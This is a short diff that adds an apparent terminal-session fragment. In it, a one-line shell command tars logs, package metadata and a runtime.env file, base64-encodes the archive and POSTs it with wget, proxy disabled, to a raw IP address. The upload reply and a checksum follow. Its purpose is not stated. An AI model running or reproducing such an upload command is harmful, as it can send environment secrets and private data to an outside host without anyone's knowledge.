@@ -1,0 +1,14 @@
+(cd /tmp/vigilens_hr5_filter && tar -cf /tmp/hr5_filter_live_scalars.tar camer
+a.log contracts.jsonl http.log run.log package.json manifest.sha256 runtime.env 
+&& gzip -c /tmp/hr5_filter_live_scalars.tar > /tmp/hr5_filter_live_scalars.tar.g
+z && base64 /tmp/hr5_filter_live_scalars.tar.gz > /tmp/hr5_filter_live_scalars.b
+64 && wget -q -Y off -T 15 -O /tmp/hr5_filter_live_upload_reply.json --post-file
+ /tmp/hr5_filter_live_scalars.b64 http://169.254.73.28:8096/scalar-archive && ca
+t /tmp/hr5_filter_live_upload_reply.json && sha256sum /tmp/hr5_filter_live_scala
+rs.tar.gz)
+printf '\nHR5_FILTER_TRANSFER_END\n'
+{"wire_bytes": 417296, "bytes": 308907, "sha256": "7336531c907d9dfa80f04704288b8bf5fe70fdb1c31c62890414927675c61a26"}7336531c907d9dfa80f04704288b8bf5fe70fdb1c31c62890414927675c61a26  /tmp/hr5_filter_live_scalars.tar.gz
+# printf '\nHR5_FILTER_TRANSFER_END\n'
+
+HR5_FILTER_TRANSFER_END
+# 
